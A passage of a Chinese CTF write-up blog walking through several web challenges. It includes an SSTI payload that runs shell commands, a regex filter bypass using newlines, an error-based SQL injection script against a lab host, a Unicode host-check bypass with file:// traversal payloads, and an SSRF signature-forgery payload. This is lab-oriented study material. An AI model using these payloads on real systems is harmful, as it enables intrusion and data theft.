<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125; </span><br><span class="line">  &#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125; </span><br><span class="line">    &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125; </span><br><span class="line">      &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">        &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125; </span><br><span class="line">          &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read()&#x27;</span>) &#125;&#125;<span class="comment">#里面是执行代码</span></span><br><span class="line">        &#123;% endif %&#125; </span><br><span class="line">      &#123;% endif %&#125; </span><br><span class="line">     &#123;% endfor %&#125; </span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>或者是可以直接用tplmap直接–os-shell拿到shell即可</p>
]]></content>
      <tags>
        <tag>RootersCTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title>Kookie!</title>
    <url>/2022/04/01/Kookie/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>RCEService</title>
    <url>/2022/04/01/RCEService/</url>
    <content><![CDATA[<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>页面提示需要按照JSON方式传入参数，随便传入一个参数看看</p>
<p>发现他以get方式传入了一个cmd，我输入的是数字他直接报过滤了，猜测这里有一个过滤把，因为是cmd传入，尝试传入一个system：ls</p>
<p>发现Invalid input输入错误了，这里就又不行了，测试发现，可以传入<code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code>执行了系统命令</p>
<p><img src="/2022/04/01/RCEService/1.png" alt="1"></p>
<p>尝试列出根目录时发现出问题了，他过滤了/，直接使用cat发现也被过滤了，没办法搞了，小看了一下wp，不知道为什么师傅们是怎么发现源代码的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = json_decode(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以发现这里是经过了正则，过滤了我们需要用的东西，他匹配了最后，我们可以用换行符，来绕过这个正则，</p>
<p>注意：在键值对里面使用换行符的时候，需要成对出现，所以我们只需要在key前面value后面添加上<code>%0a</code>即可绕过正则发现cat还是没办法用，但是在bin文件夹中发现了cat所以可以调用<code>/bin/cat</code>来使用cat命令，最后在<code>/home/rceservice</code>里面发现了flag，直接cat拿flag即可</p>
]]></content>
      <tags>
        <tag>FBCTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF2015-EasySQL</title>
    <url>/2022/04/06/RCTF2015-EasySQL/</url>
    <content><![CDATA[<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>开始的界面我还以为我走错片场了，</p>
<p>源码里啥也没藏，那就先注册登录进去看看，发现登录进去后有一个修改密码，有点嫌疑，而且下面还有三段文本。</p>
<p>点进去之后会有url处会有一个title=本来以为注入点是这里，小测了一下，发现，没用，得另找方法，那么还有嫌疑的地方就是注册登录以及修改密码了</p>
<p>发现再注册页面，如果输入一些函数什么的她会直接弹框报错，应该是有一个小waf，先直接fuzz测一下看看有那些东西是被过滤了的：</p>
<p>空格被过滤了，sleep or什么的都被过滤了，可以先用双引号构造一个注册一下看看</p>
<p>发现是可以成功登录的，找了半天，发现当我们修改密码的时候她会报错</p>
<p><img src="/2022/04/06/RCTF2015-EasySQL/1.png" alt="1"></p>
<p>这样就想到了可以利用报错注入</p>
<p>漏洞利用流程就是，创建，然后登录修改密码，读取报错</p>
<p>直接写脚本跑把：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url1 = <span class="string">&#x27;http://0e8eef6c-0f64-472d-9815-b679ecb377d6.node4.buuoj.cn:81/register.php&#x27;</span></span><br><span class="line"><span class="comment">#name = &#x27;test&quot;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\&#x27;flag\&#x27;))),1)#&#x27;</span></span><br><span class="line"><span class="comment">#name = &#x27;test&quot;^updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(\&#x27;^f\&#x27;)))),1)#&#x27;</span></span><br><span class="line">name = <span class="string">&#x27;test&quot;^updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(\&#x27;^f\&#x27;))),1)#&#x27;</span></span><br><span class="line"><span class="comment">#name = &#x27;test&quot;^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\&#x27;users\&#x27;)&amp;&amp;(column_name)regexp(\&#x27;^r\&#x27;))),1)#&#x27;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">	<span class="string">&#x27;username&#x27;</span>: name,</span><br><span class="line">	<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">io1 = session.post(url1,data1)</span><br><span class="line"><span class="built_in">print</span>(io1.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url2 = <span class="string">&#x27;http://0e8eef6c-0f64-472d-9815-b679ecb377d6.node4.buuoj.cn:81/login.php&#x27;</span></span><br><span class="line">data2 = &#123;</span><br><span class="line">	<span class="string">&#x27;username&#x27;</span>: name,</span><br><span class="line">	<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">io2 = session.post(url2,data2)</span><br><span class="line"><span class="built_in">print</span>(io2.text)</span><br><span class="line"></span><br><span class="line">url3 = <span class="string">&#x27;http://0e8eef6c-0f64-472d-9815-b679ecb377d6.node4.buuoj.cn:81/changepwd.php&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">&#x27;newpass&#x27;</span>: <span class="string">&#x27;1234&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;oldpass&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">io = session.post(url3,data)</span><br><span class="line"><span class="built_in">print</span>(io.text)</span><br><span class="line"><span class="comment">#脚本写的小捞，师傅们看看就好</span></span><br></pre></td></tr></table></figure>

<p>注意报错注入updatexml只能显示20个字符，所以需要匹配一下flag，然后读取另一部分的时候需要反向读取内容，然后自行反向输出拼接即可</p>
]]></content>
      <tags>
        <tag>RCTF2015</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythonginx</title>
    <url>/2022/04/04/Pythonginx/</url>
    <content><![CDATA[<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>打开题目是一个搜索框</p>
<p>给了源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>

<p>简单来说她会截取我们输入的host如果第三层判断的时候等于suctf.cc那么就可以执行我们输入的内容，他对协议没有过滤，我们可以用伪协议头，第一层判断第二层判断的内容是一样的，但是到了第三层判断的时候他将其进行了编码的转换</p>
<p><strong>当URL 中出现一些特殊字符的时候，输出的结果可能不在预期</strong></p>
<p>所以我们只需要找到有那些特殊字符是可以绕过这个判断的即可</p>
<p>直接爆破所有字符就行</p>
<p>附上脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span>():</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">        uni=<span class="built_in">chr</span>(x)</span><br><span class="line">        url=<span class="string">f&quot;http://suctf.c<span class="subst">&#123;uni&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;str: &quot;</span>+uni+<span class="string">&#x27; unicode: \\u&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>(<span class="params">url</span>):</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">get_unicode()</span><br></pre></td></tr></table></figure>

<p>然后随便选取一个就行。</p>
<p>进入了判断九幺考虑到读取哪个文件了，因为题目给出是nginx服务器</p>
<p>所以找一找他默认的文件配置目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br><span class="line">配置文件目录为：/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>

<p>有一个文件目录</p>
<p>进去就可以看到flag在哪个目录了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.cℂ/../../../../..//usr/local/nginx/conf/nginx.conf</span><br><span class="line">file://suctf.cℂ/../../../../..//usr/fffffflag</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>SUCTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF Me</title>
    <url>/2022/04/01/SSRF-Me/</url>
    <content><![CDATA[<p>虽然python我学的有点捞，看不太懂源码，但是简单梳理一下还是蛮清晰的</p>
<p><code>hint：flag在./flag.txt</code>中,打开页面F12读取一下源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><span class="comment">#构造方法</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):<span class="comment">#调用checkSign函数</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:<span class="comment">#如果action中含有scan则进入</span></span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:<span class="comment">#如果action中含有read则进入</span></span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):<span class="comment">#生成的签名等于我们传入的签名</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#871599161ab702d263f91fe93e3a681c</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span><span class="comment">#获得参数值通过action以及获取的param得到签名action等于scan    param是自己设置的    </span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span><span class="comment">#获取cookie中的action、sign以及param、param需要经过waf</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))<span class="comment">#直接进入exec的action所以我们现在的action应该含有read以及scan</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):<span class="comment">#经过waf函数过滤</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)<span class="comment">#使用Task对象</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())<span class="comment">#通过json返回Exec方法</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span><span class="comment">#scan方法，访问param中的网址并且将前五十个字母回显</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:<span class="comment">#是否访问超时</span></span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span><span class="comment">#传入action以及param生成签名拼接完成</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):     <span class="comment">#检测文件是否以gopher以及file开头，应该是过滤了伪协议防止直接读取到本地文件</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这道题三个路由：<code>/geneSign</code>用于测试，测试签名用，<code>/De1ta</code>是最终注入点，<code>/</code>根目录路由回显源码。</p>
<p>先看一下第一个路由：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#generate Sign For Action Scan.</span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) # !!!这个路由用于测试</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line">直接拿去param的参数以及下面的scan进入下面的getsign函数</span><br><span class="line">def getSign(action, param):#传入action以及param生成签名拼接完成</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line">然后getsign函数对他们俩进行拼接然后生成签名，可以看到拼接的时候把action直接拼接到param的后面了这里的action是固定值scan</span><br><span class="line">然后生成签名</span><br></pre></td></tr></table></figure>

<p>主要就是看第二个路由：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><br><span class="line">def challenge():#获取cookie中的action、sign以及param、param需要经过waf</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):#param经过waf函数过滤</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)#使用Task对象</span><br><span class="line">    return json.dumps(task.Exec())#通过json返回Exec方法</span><br><span class="line">    先获取上面的信息然后生成一个task对象然后通过json返回exec方法</span><br></pre></td></tr></table></figure>

<p>跟进一下exec方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&#x27;code&#x27;] = 500</span><br><span class="line">        if (self.checkSign()):#调用checkSign函数</span><br><span class="line">            if &quot;scan&quot; in self.action:#如果action中含有scan则进入</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#x27;data&#x27;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:#如果action中含有read则进入</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;)</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">                result[&#x27;data&#x27;] = f.read()</span><br><span class="line">            if result[&#x27;code&#x27;] == 500:</span><br><span class="line">                result[&#x27;data&#x27;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#x27;code&#x27;] = 500</span><br><span class="line">            result[&#x27;msg&#x27;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line">     </span><br><span class="line">首先要先经过checksign检查签名，需要我们传入的签名是等于现在访问生成的签名才能进入否则直接500报错</span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):#生成的签名等于我们传入的签名</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line">然后进入第二个判断，判断action里面有没有scan，注意这里是in 而不是==所以这里只需要有就行</span><br><span class="line">如果有那就将访问的目录内容写入到result当中，</span><br><span class="line">既然写入了，还得读取，所以他的action里面还得有read字符，这样才能将我们写入的内容读取出来</span><br><span class="line">这样就又回到了之前的签名设计</span><br><span class="line">我们看到签名在设计的时候是将param跟action进行了一个拼接是直接添加到后面的，而action只有一个scan，所以我们可以在param的键值的最后添加一个read，这样在获取签名的时候就成功将他们拼接到一起了，也就相当与我们访问flag.txt，action为read和scan他俩的签名是一样的，所以我们直接在getsign获取签名，然后将其放在De1te路由的cookie里面就行了</span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/De1te?param=flag.txt</span><br><span class="line">coookie: action=readscan; sign=ef2edd7c90d0edb517ce68a20cb8a523</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
]]></content>
      <tags>
        <tag>De1CTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRFMe</title>
    <url>/2022/04/06/SSRFMe/</url>
